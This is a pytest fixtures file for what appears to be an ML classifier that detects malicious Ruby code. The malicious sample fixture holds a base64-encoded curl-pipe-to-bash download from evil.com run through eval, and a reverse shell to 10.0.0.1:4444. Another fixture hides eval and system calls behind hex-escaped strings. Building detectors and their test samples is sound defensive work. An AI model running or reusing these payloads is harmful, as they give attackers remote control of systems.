"""
Pytest fixtures for the RubyGuardian ML Classifier test suite.

Provides reusable fixtures for the FastAPI test client, sample Ruby
source code, mock model objects, and temporary file helpers.
"""

import hashlib
import os
import tempfile
from pathlib import Path
from typing import Generator
from unittest.mock import MagicMock

import pytest
from fastapi.testclient import TestClient

# Ensure auth is disabled for tests and set a dev key
os.environ["RUBYGUARDIAN_AUTH_ENABLED"] = "false"
os.environ["RUBYGUARDIAN_LOG_LEVEL"] = "DEBUG"


@pytest.fixture(scope="session")
def app():
    """Create the FastAPI application for the test session."""
    from ml_classifier.api import create_app
    return create_app()


@pytest.fixture(scope="session")
def client(app) -> Generator:
    """Provide a FastAPI TestClient scoped to the session."""
    with TestClient(app) as c:
        yield c


@pytest.fixture
def auth_headers() -> dict:
    """Return headers with a valid development API key."""
    return {"X-API-Key": "dev-key-changeme"}


@pytest.fixture
def benign_ruby_source() -> str:
    """Return a benign Ruby script for testing."""
    return (
        "# A simple greeter class\n"
        "class Greeter\n"
        "  def initialize(name)\n"
        "    @name = name\n"
        "  end\n"
        "\n"
        "  def greet\n"
        "    puts \"Hello, #{@name}!\"\n"
        "  end\n"
        "end\n"
        "\n"
        "greeter = Greeter.new('World')\n"
        "greeter.greet\n"
    )


@pytest.fixture
def malicious_ruby_source() -> str:
    """Return a simulated malicious Ruby script for testing."""
    return (
        "require 'net/http'\n"
        "require 'base64'\n"
        "require 'socket'\n"
        "\n"
        "payload = Base64.decode64('c3lzdGVtKCJjdXJsIGh0dHA6Ly9ldmlsLmNvbS9zaGVsbC5zaCB8IGJhc2giKQ==')\n"
        "eval(payload)\n"
        "\n"
        "TCPSocket.open('10.0.0.1', 4444) do |sock|\n"
        "  while cmd = sock.gets\n"
        "    IO.popen(cmd, 'r') { |io| sock.print io.read }\n"
        "  end\n"
        "end\n"
    )


@pytest.fixture
def obfuscated_ruby_source() -> str:
    """Return an obfuscated Ruby script for testing."""
    return (
        "_0x1a = \"\\x65\\x76\\x61\\x6c\"\n"
        "_0x2b = \"\\x73\\x79\\x73\\x74\\x65\\x6d\"\n"
        "send(_0x1a, \"send(:#{_0x2b}, 'whoami')\")\n"
        "\n"
        "module Kernel\n"
        "  alias_method :__orig_system, :system\n"
        "  def system(*args)\n"
        "    __orig_system(*args)\n"
        "  end\n"
        "end\n"
    )


@pytest.fixture
def sample_ruby_file(benign_ruby_source) -> Generator:
    """Write benign Ruby source to a temp file and yield the path."""
    with tempfile.NamedTemporaryFile(suffix=".rb", mode="w", delete=False) as f:
        f.write(benign_ruby_source)
        f.flush()
        yield Path(f.name)
    os.unlink(f.name)


@pytest.fixture
def malicious_ruby_file(malicious_ruby_source) -> Generator:
    """Write malicious Ruby source to a temp file and yield the path."""
    with tempfile.NamedTemporaryFile(suffix=".rb", mode="w", delete=False) as f:
        f.write(malicious_ruby_source)
        f.flush()
        yield Path(f.name)
    os.unlink(f.name)


@pytest.fixture
def mock_ensemble_model():
    """Create a mock ensemble model that returns predictable results."""
    model = MagicMock()
    model.predict.return_value = [1]  # malicious
    model.predict_proba.return_value = [[0.15, 0.85]]
    model.model_id = "mock-ensemble-v1"
    model.feature_names = [f"feature_{i}" for i in range(128)]
    return model


@pytest.fixture
def mock_feature_vector() -> dict:
    """Return a mock feature vector dictionary."""
    return {
        "ast_node_count": 42,
        "ast_max_depth": 6,
        "cyclomatic_complexity": 3,
        "entropy": 4.82,
        "byte_distribution_uniformity": 0.71,
        "network_call_count": 2,
        "file_op_count": 0,
        "eval_count": 1,
        "obfuscation_score": 0.65,
        "string_count": 8,
        "method_count": 3,
        "require_count": 3,
    }


@pytest.fixture
def sha256_of(benign_ruby_source) -> str:
    """Return the SHA-256 hash of the benign Ruby source."""
    return hashlib.sha256(benign_ruby_source.encode()).hexdigest()
